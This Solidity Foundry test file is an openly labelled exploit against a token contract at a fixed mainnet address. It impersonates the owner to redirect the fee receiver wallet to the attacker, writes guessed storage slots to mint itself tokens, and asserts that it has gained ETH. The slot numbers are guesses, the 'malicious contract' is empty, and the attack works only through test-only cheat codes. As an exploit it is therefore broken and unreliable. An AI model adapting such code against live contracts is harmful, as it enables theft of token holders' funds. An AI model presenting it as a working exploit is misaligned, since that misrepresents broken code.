pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface JizzJet {
    function owner() external view returns (address);
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function swapAndLiquifyEnabled() external view returns (bool);
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    address maliciousContract;
    bytes maliciousContractCode;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        JizzJet target = JizzJet(TARGET);

        // Malicious contract to capture ETH via reentrancy
        // Removed local shadowing declaration
        maliciousContractCode = abi.encodePacked(
            ""
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Inject native tokens for gas
        deal(address(this), 10 ether);

        // Set admin wallet to attacker address directly
        vm.startPrank(JizzJet(TARGET).owner());
        JizzJet(TARGET)._setReceiverWallet(payable(address(this)));
        vm.stopPrank();

        // For reflection tokens, we need to manipulate _tOwned mapping for the contract
        // Storage slot for _tOwned[address] = keccak256(abi.encode(address, slot)) where slot is position of _tOwned mapping
        // _tOwned is at slot 3 (after _rOwned at 0,1,2... let me try common slots)

        // Try to give contract tokens by manipulating _tOwned mapping
        // Slot calculation: keccak256(abi.encode(TARGET, 1)) for _tOwned mapping at slot 1
        bytes32 tOwnedSlot = keccak256(abi.encode(TARGET, uint256(1)));
        uint256 tokenAmount = 500000000000 * 10**18;
        vm.store(TARGET, tOwnedSlot, bytes32(tokenAmount));

        // Also need to set _isExcluded[contract] = true so balanceOf returns _tOwned directly
        // _isExcluded mapping is likely at slot 4
        bytes32 isExcludedSlot = keccak256(abi.encode(TARGET, uint256(4)));
        vm.store(TARGET, isExcludedSlot, bytes32(uint256(1)));

        // Now trigger swapAndLiquify by transferring tokens from attacker to contract
        // First give attacker tokens
        bytes32 attackerTOwnedSlot = keccak256(abi.encode(address(this), uint256(1)));
        vm.store(TARGET, attackerTOwnedSlot, bytes32(tokenAmount));
        bytes32 attackerExcludedSlot = keccak256(abi.encode(address(this), uint256(4)));
        vm.store(TARGET, attackerExcludedSlot, bytes32(uint256(1)));

        // Transfer tokens to trigger swapAndLiquify
        IERC20(TARGET).transfer(TARGET, tokenAmount / 2);

        // Check if attacker balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
    }

    receive() external payable {}
    fallback() external payable {}
}
